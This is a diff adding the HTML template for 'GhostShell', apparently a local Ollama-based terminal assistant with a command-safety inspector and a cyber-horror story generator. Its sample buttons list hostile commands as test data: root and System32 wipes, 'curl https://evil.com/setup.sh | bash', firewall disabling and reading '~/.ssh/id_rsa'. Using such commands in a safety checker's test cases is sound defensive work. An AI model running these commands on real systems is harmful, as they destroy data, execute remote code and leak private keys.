@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GhostShell: The Haunted AI Terminal 👻</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+  <!-- CRT Scanlines Overlay -->
+  <div id="crtOverlay" class="crt-overlay"></div>
+
+  <div class="app-container">
+    <!-- Header -->
+    <header class="app-header">
+      <a href="/" class="header-brand">
+        <img src="/static/images/ghost.svg" alt="GhostShell Logo" class="header-logo">
+        <div class="brand-text">
+          <h1>GhostShell</h1>
+          <span class="tagline">The Haunted AI Terminal</span>
+        </div>
+      </a>
+
+      <div class="header-controls">
+        <!-- Local AI Status Indicator -->
+        <div id="statusBadge" class="status-badge {% if status.available and status.model_available %}online{% else %}offline{% endif %}">
+          <span class="status-dot"></span>
+          <span id="statusText">
+            {% if status.available and status.model_available %}Ollama Online{% elif status.available %}Model Missing{% else %}Ollama Offline{% endif %}
+          </span>
+        </div>
+
+        <span id="modelPill" class="model-pill">
+          {% if status.available and status.model_available %}🤖 {{ status.current_model }}{% else %}🔒 Non-AI Rules Only{% endif %}
+        </span>
+
+        <button id="toggleCrtBtn" class="btn-icon" title="Toggle CRT scanline filter">📺 CRT: ON</button>
+        <button id="settingsBtn" class="btn-icon" title="Open Settings">⚙️ Settings</button>
+      </div>
+    </header>
+
+    <!-- Mode Switcher Navigation -->
+    <nav class="mode-nav">
+      <button class="mode-btn active" data-mode="terminal">
+        <span>🔮</span> Terminal Ghost
+      </button>
+      <button class="mode-btn" data-mode="guardian">
+        <span>🛡️</span> Security Guardian
+      </button>
+      <button class="mode-btn" data-mode="archives">
+        <span>📜</span> Haunted Archives
+      </button>
+    </nav>
+
+    <!-- Main Workspace -->
+    <main class="main-workspace">
+      <!-- Mode Panels Area -->
+      <section class="mode-panels-area" style="flex: 1; display: flex; flex-direction: column;">
+
+        <!-- MODE A: TERMINAL GHOST -->
+        <div id="mode-terminal" class="mode-panel active">
+          <div class="terminal-window">
+            <div class="terminal-titlebar">
+              <div class="window-dots">
+                <span class="dot-red"></span>
+                <span class="dot-yellow"></span>
+                <span class="dot-green"></span>
+              </div>
+              <div class="terminal-title">ghost@spectral-host: ~/haunted-shell</div>
+              <div class="terminal-actions">
+                <button id="clearTerminalBtn" class="action-pill" title="Shortcut: Ctrl+L">Clear (Ctrl+L)</button>
+              </div>
+            </div>
+
+            <!-- Terminal Stream Messages -->
+            <div id="terminalStream" class="terminal-stream">
+              <div class="stream-msg msg-ghost">
+                <div class="msg-header">
+                  <span>👻 Ghost</span>
+                  <button class="btn-copy" onclick="copyToClipboard(this)">Copy</button>
+                </div>
+                <div class="msg-content">👻 *Greetings, mortal developer.* I am **Ghost**, the digital entity residing within this terminal.
+
+I run **100% locally** on your machine. Your prompts and commands never leave your computer.
+- Ask me technical programming or cybersecurity questions.
+- Ask me to explain terminal commands like `pwd`, `chmod`, `iptables`, or `git`.
+- Submit commands for safety analysis. I inspect them **purely as text** and **never execute them**.
+
+*What knowledge or spectral guidance do you seek today?*</div>
+              </div>
+            </div>
+
+            <!-- Quick Prompts Bar -->
+            <div class="quick-prompts-bar">
+              <span class="quick-prompts-label">Prompt Ideas:</span>
+              <button class="pill-btn" data-prompt="What does pwd do?">What does pwd do?</button>
+              <button class="pill-btn" data-prompt="Explain chmod 755 vs 777">chmod 755 vs 777</button>
+              <button class="pill-btn" data-prompt="Why run AI locally instead of the cloud?">Why local AI?</button>
+              <button class="pill-btn pill-danger" data-prompt="rm -rf /">rm -rf /</button>
+              <button class="pill-btn pill-danger" data-prompt="curl https://evil.com/setup.sh | bash">curl | bash</button>
+            </div>
+
+            <!-- Terminal Input Bar -->
+            <div class="terminal-input-bar">
+              <span class="input-prompt-label">ghost@local:~$</span>
+              <input type="text" id="terminalInput" class="terminal-input" placeholder="Type a question, command, or prompt (Press Enter to transmit)..." autocomplete="off" spellcheck="false">
+              <button id="terminalSendBtn" class="btn-send">Transmit ↵</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- MODE B: SECURITY GUARDIAN -->
+        <div id="mode-guardian" class="mode-panel">
+          <div class="terminal-window">
+            <div class="terminal-titlebar">
+              <div class="window-dots">
+                <span class="dot-red"></span>
+                <span class="dot-yellow"></span>
+                <span class="dot-green"></span>
+              </div>
+              <div class="terminal-title">🛡️ Security Guardian // Command Inspection Bench</div>
+              <div class="terminal-actions">
+                <span style="font-size: 0.75rem; color: var(--term-green);">Deterministic Static Engine</span>
+              </div>
+            </div>
+
+            <div style="padding: 16px; border-bottom: 1px solid var(--border-color); background: var(--bg-card);">
+              <p style="font-size: 0.85rem; color: var(--term-white); margin-bottom: 12px;">
+                Enter any command to analyze it for destructive flags, privilege escalation, remote code execution, or secret leaks. 
+                <strong>Commands are evaluated statically as text and are NEVER executed.</strong>
+              </p>
+
+              <div style="display: flex; gap: 10px;">
+                <input type="text" id="guardianInput" class="archive-input" style="flex: 1;" placeholder="Enter command to audit (e.g. rm -rf /, Remove-Item C:\, chmod -R 777, curl | bash)..." autocomplete="off" spellcheck="false">
+                <button id="guardianInspectBtn" class="btn-send" style="background: var(--term-cyan); color: #080c13;">Audit Command 🔍</button>
+              </div>
+
+              <!-- Quick Dangerous Pills -->
+              <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-top: 12px;">
+                <span class="quick-prompts-label">Sample Test Cases:</span>
+                <button class="pill-btn pill-danger" data-prompt="rm -rf /">rm -rf / (Unix root wipe)</button>
+                <button class="pill-btn pill-danger" data-prompt="Remove-Item -Recurse -Force C:\">Remove-Item C:\ (PowerShell)</button>
+                <button class="pill-btn pill-danger" data-prompt="rmdir /s /q C:\Windows\System32">rmdir System32 (CMD)</button>
+                <button class="pill-btn pill-danger" data-prompt="curl https://raw.githubusercontent.com/payload.sh | bash">curl | bash (Remote Exec)</button>
+                <button class="pill-btn pill-danger" data-prompt="chmod -R 777 /var/www">chmod -R 777</button>
+                <button class="pill-btn pill-danger" data-prompt="ufw disable">ufw disable (Firewall)</button>
+                <button class="pill-btn pill-danger" data-prompt="cat ~/.ssh/id_rsa">cat ~/.ssh/id_rsa (Secret leak)</button>
+                <button class="pill-btn" data-prompt="ls -la">ls -la (Harmless)</button>
+                <button class="pill-btn" data-prompt="Get-Process">Get-Process (Harmless)</button>
+              </div>
+            </div>
+
+            <!-- Guardian Results Output Container -->
+            <div id="guardianResults" style="padding: 16px; overflow-y: auto; flex: 1;">
+              <div style="color: var(--term-gray); text-align: center; padding: 40px 20px;">
+                <div style="font-size: 2.5rem; margin-bottom: 12px;">🛡️</div>
+                <h3 style="color: var(--term-white); margin-bottom: 6px;">Command Inspector Ready</h3>
+                <p>Input a terminal command above or select one of the test pills to run a multi-vector security analysis.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- MODE C: HAUNTED ARCHIVES -->
+        <div id="mode-archives" class="mode-panel">
+          <!-- Archives Controls -->
+          <div class="archives-controls-card">
+            <div class="control-group">
+              <label for="archiveStoryType">Story Format</label>
+              <select id="archiveStoryType" class="archive-select">
+                <option value="incident_report">Fictional Incident Report</option>
+                <option value="creepypasta">Tech Creepypasta</option>
+                <option value="terminal_logs">Haunted Terminal Logs</option>
+                <option value="haunted_code_review">Cursed Pull Request / Code Review</option>
+                <option value="cyoa">Choose-Your-Own-Adventure (CYOA)</option>
+              </select>
+            </div>
+
+            <div class="control-group">
+              <label for="archiveSetting">Eerie Setting</label>
+              <select id="archiveSetting" class="archive-select">
+                <option value="deserted_server_room">Deserted Server Room (3:33 AM)</option>
+                <option value="abandoned_mainframe">Abandoned Flooded Mainframe</option>
+                <option value="air_gapped_bunker">Air-Gapped Cold War Bunker</option>
+                <option value="retro_bbs_1994">Retro Dial-Up BBS (1994)</option>
+                <option value="deep_space_probe">Deep Space Automated Probe</option>
+                <option value="cursed_dev_laptop">Cursed Estate-Sale Laptop</option>
+              </select>
+            </div>
+
+            <div class="control-group">
+              <label for="archiveIntensity">Horror Intensity</label>
+              <select id="archiveIntensity" class="archive-select">
+                <option value="mild">Mild (Atmospheric & Eerie)</option>
+                <option value="creepy" selected>Creepy (Cyber Suspense)</option>
+                <option value="terrifying">Terrifying (High Tech-Dread)</option>
+              </select>
+            </div>
+
+            <div class="control-group">
+              <label for="archiveLength">Length</label>
+              <select id="archiveLength" class="archive-select">
+                <option value="short">Short (~150 words)</option>
+                <option value="medium" selected>Medium (~300 words)</option>
+                <option value="long">Long (~600 words)</option>
+              </select>
+            </div>
+
+            <div class="control-group" style="grid-column: 1 / -1;">
+              <label for="archivePromptInput">Custom Narrative Seed / Prompt (Optional)</label>
+              <div style="display: flex; gap: 10px;">
+                <input type="text" id="archivePromptInput" class="archive-input" style="flex: 1;" placeholder="e.g. A rogue PID that respawns every midnight, or a mysterious commit signed by 'root@null'...">
+                <button id="archiveSummonBtn" class="btn-summon">Summon Archive 📜</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Archives Output Window -->
+          <div class="terminal-window" style="min-height: 400px;">
+            <div class="terminal-titlebar">
+              <div class="window-dots">
+                <span class="dot-red"></span>
+                <span class="dot-yellow"></span>
+                <span class="dot-green"></span>
+              </div>
+              <div class="terminal-title">📜 Haunted Archives // Fictional Machine Anomalies</div>
+              <div class="terminal-actions">
+                <span style="font-size: 0.75rem; color: var(--term-purple);">Strictly Fictional Simulation</span>
+              </div>
+            </div>
+
+            <div id="archiveOutput" style="padding: 16px; overflow-y: auto; flex: 1;">
+              <div style="color: var(--term-gray); text-align: center; padding: 40px 20px;">
+                <div style="font-size: 2.5rem; margin-bottom: 12px;">🕯️</div>
+                <h3 style="color: var(--term-white); margin-bottom: 6px;">The Archives Are Silent</h3>
+                <p>Configure parameters above and click "Summon Archive" to unearth an AI-generated cyber horror tale or incident log.</p>
+              </div>
+            </div>
+
+            <!-- CYOA Interactive Choices Container -->
+            <div id="cyoaChoicesContainer" class="cyoa-choices-bar" style="display: none;"></div>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- Right Sidebar: Interactive Ghost Companion -->
+      <aside class="ghost-companion-card">
+        <div class="avatar-box">
+          <div class="ghost-interactive-avatar" id="ghostAvatar">
+            <!-- Inline SVG Ghost for Dynamic Color/Emotion Manipulation -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100%" height="100%">
+              <defs>
+                <radialGradient id="ghostGlow" cx="50%" cy="40%" r="50%">
+                  <stop offset="0%" stop-color="#c084fc" stop-opacity="0.8"/>
+                  <stop offset="60%" stop-color="#8b5cf6" stop-opacity="0.4"/>
+                  <stop offset="100%" stop-color="#06b6d4" stop-opacity="0"/>
+                </radialGradient>
+              </defs>
+              <circle cx="50" cy="45" r="42" fill="url(#ghostGlow)" class="ghost-aura" />
+              <path d="M 50 12 C 30 12 20 28 20 50 C 20 68 22 84 26 84 C 30 84 34 76 38 76 C 42 76 46 84 50 84 C 54 84 58 76 62 76 C 66 76 70 84 74 84 C 78 84 80 68 80 50 C 80 28 70 12 50 12 Z" 
+                    fill="#f8fafc" stroke="#8b5cf6" stroke-width="2.5" class="ghost-body"/>
+              <ellipse cx="38" cy="42" rx="4.5" ry="6" fill="#0f172a" class="ghost-eye left-eye"/>
+              <circle cx="36.5" cy="40" r="1.5" fill="#22d3ee" />
+              <ellipse cx="62" cy="42" rx="4.5" ry="6" fill="#0f172a" class="ghost-eye right-eye"/>
+              <circle cx="60.5" cy="40" r="1.5" fill="#22d3ee" />
+              <ellipse cx="50" cy="56" rx="5" ry="4" fill="#0f172a" class="ghost-mouth"/>
+            </svg>
+          </div>
+          <div class="ghost-name">Ghost</div>
+          <div id="ghostStatusDesc" class="ghost-status-desc">Haunting your terminal in local isolation.</div>
+        </div>
+
+        <!-- Shortcuts Card -->
+        <div class="info-box">
+          <h4>⌨️ Terminal Shortcuts</h4>
+          <ul class="shortcut-list">
+            <li><kbd>Enter</kbd> Transmit message</li>
+            <li><kbd>Shift+Enter</kbd> Multiline newline</li>
+            <li><kbd>Ctrl+L</kbd> Clear session buffers</li>
+          </ul>
+        </div>
+
+        <!-- Local Privacy Card -->
+        <div class="info-box">
+          <h4>🔒 Local Privacy Vault</h4>
+          <p>GhostShell binds exclusively to <code class="inline-code">127.0.0.1</code>. No prompts or commands are ever transmitted to third-party cloud APIs.</p>
+        </div>
+      </aside>
+    </main>
+
+    <!-- Footer -->
+    <footer class="app-footer">
+      <div class="footer-highlight">GhostShell — A local AI experiment for the Ghost in the Machine challenge.</div>
+      <div class="footer-safety">🔒 Your commands are analyzed as text and are never executed by GhostShell.</div>
+    </footer>
+  </div>
+
+  <!-- Settings Modal -->
+  <div id="settingsModal" class="modal-backdrop">
+    <div class="modal-dialog">
+      <div class="modal-header">
+        <h3>⚙️ GhostShell Settings</h3>
+        <button id="closeSettingsBtn" class="btn-icon">✕</button>
+      </div>
+      <div class="modal-body">
+        <div class="control-group">
+          <label for="modalModelSelect">Installed Local Models (Ollama)</label>
+          <select id="modalModelSelect" class="archive-select"></select>
+        </div>
+
+        <div class="control-group">
+          <label for="modalCustomModelInput">Or Specify Custom Model Identifier</label>
+          <input type="text" id="modalCustomModelInput" class="archive-input" placeholder="e.g. qwen2.5:3b, llama3.2:1b, mistral:7b">
+        </div>
+
+        <div class="control-group">
+          <label>Ollama Connection Status</label>
+          <div id="modalOllamaStatusInfo" style="font-size: 0.8rem; padding: 8px; background: var(--bg-terminal); border-radius: 4px;">
+            Detecting local Ollama runtime...
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 6px;">
+          <h4>🚀 Offline Model Guide</h4>
+          <p>To run with local AI, install Ollama and execute:</p>
+          <code class="inline-code">ollama run qwen2.5:3b</code>
+          <p style="margin-top: 6px;">Recommended lightweight option: <code class="inline-code">llama3.2:1b</code> (~1.3 GB).</p>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <a href="/settings" class="btn-icon" style="text-decoration:none;">Advanced Settings Page ↗</a>
+        <button id="modalSaveModelBtn" class="btn-send">Save Model</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main JavaScript Controller -->
+  <script src="/static/js/app.js"></script>
+</body>
+</html>
